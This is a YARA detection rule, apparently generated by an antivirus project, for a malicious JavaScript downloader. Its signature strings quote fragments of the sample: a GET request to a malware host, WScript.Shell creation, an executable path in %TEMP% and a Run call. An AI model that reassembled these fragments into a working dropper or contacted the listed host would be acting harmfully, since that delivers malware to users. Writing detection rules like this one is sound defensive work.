rule sig_20160401_a337308ba258f1414f4a4df72f8f7a4b {
  meta:
    description = "datamaliciousorder - file 20160401_a337308ba258f1414f4a4df72f8f7a4b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7a0e281daa8326f461e6ff2e49568aa387006c100dd8a22852cd1b12210e91f2"

  strings:
    $s1  = "ApoPs[BhNms](\"G\" + \"ET\", \"http://be-stlines-tore.com/j38sf\", false);" fullword ascii
    $s2  = "function GtAmd(GeNzc, JdvAtm){TwNv = TwNv * 1; return GeNzc - JdvAtm;};" fullword ascii
    $s3  = "var BthNz = function OlJw() {return WScript[KmTgc](\"WScript\"+\".Shell\");}(), LauAba = 11;" fullword ascii
    $s4  = "if (ApoPs[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function IplJuw() {return BthNz[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"gPXGHriRUl.ex\" + \"e\";};" fullword ascii
    $s6  = "function VnVb(){return KxiBc + \"\";};" fullword ascii
    $s7  = "function TpzCi() {return ((QrxQay == true) && (QrxQay == QejVl)) ? 1 : TwNv;};" fullword ascii
    $s8  = "function MoAfj(SkcBqg){BthNz[\"R\"+\"un\"](SkcBqg, TwNv, TwNv);};" fullword ascii
    $s9  = "QrxQay = true; " fullword ascii
    $s10 = "QejVl = true; " fullword ascii
    $s11 = "}while (TrVkl);" fullword ascii
    $s12 = "var AmaXu = new this[\"Date\"]();" fullword ascii
    $s13 = "function ZtaTqv(){return KmTgc;};" fullword ascii
    $s14 = "function YcMu(QayXa) {var YknYk = (1, 2, 3, 4, 5, QayXa); return YknYk;};" fullword ascii
    $s15 = "function YpGup()" fullword ascii
    $s16 = "function YeoRqv(){return 23;};" fullword ascii
    $s17 = "var QejVl = false;" fullword ascii
    $s18 = "return GtAmd(KdAdm, ToAo);" fullword ascii
    $s19 = "var NhmHnv = false;" fullword ascii
    $s20 = "var QrxQay = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}